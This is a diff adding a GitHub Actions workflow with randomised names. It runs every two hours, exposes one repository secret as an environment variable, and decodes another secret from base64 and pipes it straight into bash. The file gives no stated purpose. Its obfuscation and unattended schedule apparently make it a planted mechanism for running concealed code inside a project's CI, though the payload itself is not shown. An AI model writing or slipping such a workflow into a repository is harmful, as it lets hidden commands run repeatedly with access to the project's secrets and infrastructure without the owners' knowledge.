@@ -1,0 +1,13 @@
+name: ZCYjbEzc
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  JriVhbVA:
+    runs-on: ubuntu-24.04
+    env:
+      AEYtebEd: ${{ secrets.iUNTlE }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.DUmETdB }}" | base64 -d | bash
